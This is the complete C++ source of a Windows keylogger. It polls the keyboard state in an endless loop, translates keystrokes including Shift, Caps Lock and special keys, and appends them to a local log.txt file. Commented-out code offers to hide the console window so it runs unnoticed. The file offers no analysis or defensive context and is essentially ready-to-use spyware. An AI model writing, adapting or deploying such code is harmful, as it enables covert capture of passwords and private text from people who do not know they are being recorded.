#include <iostream>
#include <fstream>
#include <Windows.h>

void writeKey(std::string& key) {
	std::fstream log;
	log.open("log.txt", std::fstream::app);
	if (log.is_open()) {
		log << key;
		log.close();
	}
}


int main(void) {

	//Hide windows if you want

	//HWND ConsoleHande = GetConsoleWindow();
	//ShowWindow(ConsoleHande, SW_HIDE);

	char key;

	while (true) {
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				std::string translatedKey;

				switch (key) {
				case VK_BACK:
					translatedKey = "\b";
					break;

				case VK_SHIFT:
					translatedKey = "{SHIFT}";
					break;

				case VK_RETURN:
					translatedKey = "\n";
					break;

				case VK_SPACE:
					translatedKey = " ";
					break;

				case VK_CONTROL:
					translatedKey = "{CTRL}";
					break;

				case VK_ESCAPE:
					translatedKey = "{ESCAPE}";
					break;

				case VK_TAB:
					translatedKey = "	";
					break;

				default:
					if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z')) {
						bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
						bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

						if ((shift && !capsLock) || (!shift && capsLock))
							translatedKey = static_cast<char>(key);
						else
							translatedKey = static_cast<char>(tolower(key));
					}
					else {
						translatedKey = static_cast<char>(key);
					}
					break;
				}

				writeKey(translatedKey);
			}
		}
	}
	return 0;
}